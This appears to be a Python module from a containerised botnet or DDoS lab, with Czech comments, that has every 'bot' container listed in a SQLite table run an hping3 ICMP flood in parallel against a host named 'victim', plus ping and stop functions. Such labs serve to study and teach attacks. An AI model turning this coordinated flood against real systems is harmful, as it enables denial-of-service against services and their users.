import docker, threading, sqlite3
from .settings import client


def ping(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("ping -c 4 victim")
    print(result.output.decode())


def icmp_flood(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("hping3 --icmp --flood victim")
    print(result.output.decode())


def execute_attack(attack):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT container_id FROM bots")
    result = cursor.fetchall()
    container_ids = [x[0] for x in result]
    threads = [
        threading.Thread(target=attack, args=(container_id,))
        for container_id in container_ids
    ]

    # Spuštění všech vláken
    for thread in threads:
        thread.start()
    # Čekání na dokončení všech vláken
    for thread in threads:
        thread.join()

    conn.close()
    return "Attack finished"


def stop_attack(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("pkill hping3")
    print(result.output.decode())
